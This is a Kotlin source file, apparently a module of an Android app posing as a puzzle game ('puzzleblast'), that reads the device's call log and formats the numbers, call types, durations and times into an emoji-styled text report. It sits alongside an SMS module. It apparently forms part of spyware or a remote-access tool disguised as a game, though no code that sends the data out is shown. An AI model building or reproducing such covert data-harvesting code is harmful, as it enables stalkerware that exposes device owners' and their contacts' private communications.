package com.puzzleblast.game.modules

import android.content.Context
import android.provider.CallLog

object CallLogModule {
    suspend fun read(ctx: Context, n: Int = 20): String {
        val sb = StringBuilder("📞 Call log · $n\n")
        val cursor = ctx.contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DURATION, CallLog.Calls.DATE),
            null, null, "${CallLog.Calls.DATE} DESC LIMIT $n"
        ) ?: return "no call log access"
        cursor.use { c ->
            while (c.moveToNext()) {
                val num = c.getString(0) ?: "?"
                val type = when (c.getInt(1)) {
                    CallLog.Calls.INCOMING_TYPE -> "in"
                    CallLog.Calls.OUTGOING_TYPE -> "out"
                    CallLog.Calls.MISSED_TYPE -> "missed"
                    else -> "?"
                }
                val dur = c.getLong(2)
                val date = c.getLong(3)
                sb.append("📞 $num · $type · ${dur}s · ${SmsModule.relTime(date)}\n")
            }
        }
        return sb.toString().ifBlank { "no calls" }
    }
}
